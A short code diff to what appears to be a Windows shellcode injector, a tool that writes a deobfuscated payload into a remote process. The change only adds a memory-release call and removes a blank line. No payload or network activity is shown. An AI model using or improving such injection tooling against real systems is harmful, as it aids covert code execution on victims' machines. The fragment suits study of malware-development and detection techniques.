@@ -211,6 +211,8 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 	}
 	printf("[+] DONE !\n");
 
+	VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
+
 	return TRUE;
 }
 
@@ -257,7 +259,6 @@ int wmain(int argc, wchar_t* argv[]) {
 	if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {
 		return -1;
 	}
-
 
 	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
 	CloseHandle(hProcess);
